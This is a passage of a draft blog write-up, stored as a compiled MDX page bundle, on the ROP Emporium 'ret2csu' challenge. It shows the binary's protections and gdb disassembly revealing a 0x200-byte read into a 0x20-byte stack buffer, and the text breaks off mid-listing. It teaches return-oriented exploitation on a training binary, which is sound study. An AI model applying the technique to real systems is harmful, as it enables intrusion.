{"pageProps":{"post":{"mdxSource":"var Component=(()=>{var p=Object.create;var c=Object.defineProperty;var m=Object.getOwnPropertyDescriptor;var h=Object.getOwnPropertyNames;var N=Object.getPrototypeOf,k=Object.prototype.hasOwnProperty;var o=n=>c(n,\"__esModule\",{value:!0});var b=(n,s)=>()=>(s||n((s={exports:{}}).exports,s),s.exports),u=(n,s)=>{for(var r in s)c(n,r,{get:s[r],enumerable:!0})},i=(n,s,r,a)=>{if(s&&typeof s==\"object\"||typeof s==\"function\")for(let l of h(s))!k.call(n,l)&&(r||l!==\"default\")&&c(n,l,{get:()=>s[l],enumerable:!(a=m(s,l))||a.enumerable});return n},g=(n,s)=>i(o(c(n!=null?p(N(n)):{},\"default\",!s&&n&&n.__esModule?{get:()=>n.default,enumerable:!0}:{value:n,enumerable:!0})),n),x=(n=>(s,r)=>n&&n.get(s)||(r=i(o({}),s,1),n&&n.set(s,r),r))(typeof WeakMap!=\"undefined\"?new WeakMap:0);var d=b((T,t)=>{t.exports=_jsx_runtime});var y={};u(y,{default:()=>w,frontmatter:()=>v});var e=g(d()),v={title:\"Return-Oriented Programming - Retcsu\",date:\"2021-12-20\",tags:[\"ropemporium\",\"rop\",\"pwn\"],draft:!0,summary:\"Learn a ROP technique that lets you populate useful calling convention registers like rdi, rsi and rdx even in an environment where gadgets are sparse.\",layout:\"PostLayout\",canonicalUrl:null};function f(n={}){let{wrapper:s}=n.components||{};return s?(0,e.jsx)(s,Object.assign({},n,{children:(0,e.jsx)(r,{})})):r();function r(){let a=Object.assign({h2:\"h2\",a:\"a\",span:\"span\",p:\"p\",blockquote:\"blockquote\",strong:\"strong\",pre:\"pre\",code:\"code\",div:\"div\",ol:\"ol\",li:\"li\"},n.components),{Image:l}=a;return l||_(\"Image\",!0),(0,e.jsxs)(e.Fragment,{children:[(0,e.jsxs)(a.h2,{id:\"introduction\",children:[(0,e.jsx)(a.a,{href:\"#introduction\",\"aria-hidden\":\"true\",tabIndex:\"-1\",children:(0,e.jsx)(a.span,{className:\"icon icon-link\"})}),\"Introduction\"]}),(0,e.jsx)(a.p,{children:\"Challenge description\"}),(0,e.jsx)(a.blockquote,{children:(0,e.jsxs)(a.p,{children:[\"We're back in ret2win territory, but this time with no useful gadgets.How will we populate critical registers without them? The goal of this level is understanding of universal rop techniques due to to the limited gadgets available in the binary as compared to the ret2win challenge. The binary can be downloaded from authors website \",(0,e.jsx)(a.a,{href:\"https://ropemporium.com\",children:\"Ropemporium\"})]})}),(0,e.jsxs)(a.p,{children:[\"After downloading the binary, check the enabled protections and mitigation's. Only \",(0,e.jsx)(a.strong,{children:\"NX\"}),\" and Partial RELRO protections are turned on as shown below.\"]}),(0,e.jsx)(a.pre,{className:\"language-bash\",children:(0,e.jsxs)(a.code,{className:\"code-highlight language-bash\",children:[(0,e.jsx)(a.span,{className:\"code-line\",children:`    Arch:     amd64-64-little\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`    RELRO:    Partial RELRO\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`    Stack:    No canary found\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`    NX:       NX enabled\n`}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"    PIE:      No PIE \",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\"(\"}),\"0x400000\",(0,e.jsx)(a.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),(0,e.jsxs)(a.p,{children:[\"First step is to find the vulnerability in the binary that will enable us to subvert the program execution control flow. From the disassembly of the main function we are only calling \",(0,e.jsx)(a.strong,{children:\"pwnme\"}),\" function.\"]}),(0,e.jsx)(a.pre,{className:\"language-nasm\",children:(0,e.jsxs)(a.code,{className:\"language-nasm code-highlight\",children:[(0,e.jsx)(a.span,{className:\"code-line\",children:`(gdb) disas main\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`Dump of assembler code for function main:\n`}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0000000000400607\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),\":\tpush   \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbp\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0000000000400608\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"1\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),\":\tmov    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbp\"}),\",\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rsp\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x000000000040060b\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"4\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),\":\tcall   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x400500\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),\"pwnme@plt\",(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0000000000400610\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"9\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),\":\tmov    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"eax\"}),\",\",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0000000000400615\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"14\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),\":\tpop    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbp\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0000000000400616\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"15\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),`:\tret    \n`]}),(0,e.jsx)(a.span,{className:\"code-line\",children:`End of assembler dump.\n`})]})}),(0,e.jsxs)(a.p,{children:[\"The function reference the got table in order to load the actual address of pwnme function from \",(0,e.jsx)(a.strong,{children:\"libret2csu.so\"}),\" library after the first call.\"]}),(0,e.jsxs)(a.h2,{id:\"pwnme-disassembly\",children:[(0,e.jsx)(a.a,{href:\"#pwnme-disassembly\",\"aria-hidden\":\"true\",tabIndex:\"-1\",children:(0,e.jsx)(a.span,{className:\"icon icon-link\"})}),\"pwnme Disassembly\"]}),(0,e.jsx)(a.pre,{className:\"language-nasm\",children:(0,e.jsxs)(a.code,{className:\"language-nasm code-highlight\",children:[(0,e.jsx)(a.span,{className:\"code-line\",children:`(gdb) disas pwnme\n`}),(0,e.jsx)(a.span,{className:\"code-line\",children:`Dump of assembler code for function pwnme:\n`}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x000000000000093a\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),\":\tpush   \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbp\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x000000000000093b\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"1\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),\":\tmov    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbp\"}),\",\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rsp\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x000000000000093e\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"4\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),\":\tsub    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rsp\"}),\",\",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x20\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0000000000000942\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"8\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),\":\tmov    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rax\"}),\",QWORD PTR \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"[\"}),\"rip\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"0x201697\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"]\"}),\"        # \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x201fe0\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0000000000000949\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"15\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),\":\tmov    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rax\"}),\",QWORD PTR \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"[\"}),(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rax\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"]\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x000000000000094c\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"18\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),\":\tmov    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"ecx\"}),\",\",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0000000000000951\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"23\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),\":\tmov    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"edx\"}),\",\",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x2\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0000000000000956\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"28\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),\":\tmov    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"esi\"}),\",\",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x000000000000095b\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"33\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),\":\tmov    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rdi\"}),\",\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rax\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x000000000000095e\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"36\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),\":\tcall   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x820\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),\"setvbuf@plt\",(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0000000000000963\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"41\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),\":\tlea    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rdi\"}),\",\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"[\"}),\"rip\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"0x31e\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"]\"}),\"        # \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0xc88\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x000000000000096a\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"48\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),\":\tcall   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x7a0\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),\"puts@plt\",(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x000000000000096f\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"53\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),\":\tlea    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rdi\"}),\",\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"[\"}),\"rip\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"0x32a\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"]\"}),\"        # \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0xca0\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0000000000000976\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"60\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),\":\tcall   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x7a0\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),\"puts@plt\",(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x000000000000097b\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"65\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),\":\tlea    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rax\"}),\",\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"[\"}),(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbp\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"0x20\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"]\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x000000000000097f\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"69\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),\":\tmov    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"edx\"}),\",\",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x20\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0000000000000984\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"74\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),\":\tmov    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"esi\"}),\",\",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0000000000000989\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"79\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),\":\tmov    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rdi\"}),\",\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rax\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x000000000000098c\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"82\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),\":\tcall   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x7d0\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),\"memset@plt\",(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0000000000000991\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"87\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),\":\tlea    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rdi\"}),\",\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"[\"}),\"rip\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"0x310\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"]\"}),\"        # \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0xca8\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0000000000000998\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"94\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),\":\tcall   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x7a0\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),\"puts@plt\",(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x000000000000099d\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"99\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),\":\tlea    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rdi\"}),\",\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"[\"}),\"rip\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"0x36e\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"]\"}),\"        # \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0xd12\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x00000000000009a4\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"106\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),\":\tmov    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"eax\"}),\",\",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x00000000000009a9\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"111\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),\":\tcall   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x7c0\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),\"printf@plt\",(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x00000000000009ae\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"116\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),\":\tlea    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rax\"}),\",\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"[\"}),(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rbp\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"0x20\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"]\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x00000000000009b2\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"120\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),\":\tmov    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"edx\"}),\",\",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x200\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x00000000000009b7\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"125\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),\":\tmov    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rsi\"}),\",\",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rax\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x00000000000009ba\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"128\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),\":\tmov    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"edi\"}),\",\",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x0\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x00000000000009bf\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"133\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),\":\tcall   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x7f0\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),\"read@plt\",(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x00000000000009c4\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"138\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),\":\tlea    \",(0,e.jsx)(a.span,{className:\"token register variable\",children:\"rdi\"}),\",\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"[\"}),\"rip\",(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"0x34a\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"]\"}),\"        # \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0xd15\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x00000000000009cb\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"145\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),\":\tcall   \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x7a0\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),\"puts@plt\",(0,e.jsx)(a.span,{className:\"token operator\",children:\">\"}),`\n`]}),(0,e.jsxs)(a.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(a.span,{className:\"token number\",children:\"0x00000000000009d0\"}),\" \",(0,e.jsx)(a.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(a.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(a.span,{className:\"token number\",children:\"150\"}),(0,e.jsx)(a.span,{className:\"token 